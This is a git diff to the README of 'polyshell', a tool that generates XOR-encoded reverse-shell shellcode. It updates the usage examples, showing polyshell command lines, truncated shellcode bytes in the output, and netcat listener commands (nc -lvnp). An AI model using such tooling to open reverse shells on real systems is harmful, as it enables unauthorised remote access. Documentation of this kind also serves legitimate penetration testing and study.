@@ -53,7 +53,7 @@ ln -s $(readlink -f main.py) ~/.local/bin/polyshell
     
 ## Run
 
-### Create a reverse shell and build it
+### Create a reverse shell and build it, save the shellcode in a TXT file
 
 ```bash
 ┌[t4yki@d3v]
@@ -71,8 +71,13 @@ ln -s $(readlink -f main.py) ~/.local/bin/polyshell
                 Vadimador - Ninuuu - t4yki
          https://github.com/Vadimador/polyshell
 
-    
- [!] Shellcode generated!
+
+ [!] Shellcode generated :
+
+\x4d\x31\xc9\x4d...\x0f\x05
+
+
+ [!] Shellcode saved at shellcode.txt
 
  [+] Number of xor put : 10
  [+] IPv4 address to connect to : 127.0.0.1
@@ -81,10 +86,10 @@ ln -s $(readlink -f main.py) ~/.local/bin/polyshell
  [+] Start a listener : nc -lvnp 6666
  ```
 
- ### Create a reverse shell and modify the number of xor
+ ### Create a reverse shell and modify the number of xor and hide shellcode printing
 ```bash
 ┌[Vadimador@d3v] 
-└[~]> polyshell -i 127.0.0.1 -p 1024 -n 54 -b
+└[~]> polyshell -i 127.0.0.1 -p 1024 -x 54 -b -n
 
 
      ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
@@ -98,8 +103,8 @@ ln -s $(readlink -f main.py) ~/.local/bin/polyshell
                 Vadimador - Ninuuu - t4yki
          https://github.com/Vadimador/polyshell
 
-    
- [!] Shellcode generated!
+ 
+ [!] Shellcode saved at shellcode.txt
 
  [+] Number of xor put : 54
  [+] IPv4 address to connect to : 127.0.0.1
@@ -108,11 +113,11 @@ ln -s $(readlink -f main.py) ~/.local/bin/polyshell
  [+] Start a listener : nc -lvnp 1024
 ```
 
-### Create a reverse shell but don't build it, just save it to C file.
+### Create a reverse shell but don't build it, just save it to C and TXT file.
 
 ```bash
 ┌[Ninuuu@d3v] 
-└[~]> polyshell -i 127.0.0.1 -p 4444 -n 88
+└[~]> polyshell -i 127.0.0.1 -p 4444 -x 88
 
 
      ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
@@ -126,8 +131,13 @@ ln -s $(readlink -f main.py) ~/.local/bin/polyshell
                 Vadimador - Ninuuu - t4yki
          https://github.com/Vadimador/polyshell
 
-    
- [!] Shellcode generated!
+
+ [!] Shellcode generated :
+
+\x4d\x31\xed\x4d\x31\xed\x4d...\x0f\x05
+
+
+ [!] Shellcode saved at shellcode.txt
 
  [+] Number of xor put : 88
  [+] IPv4 address to connect to : 127.0.0.1
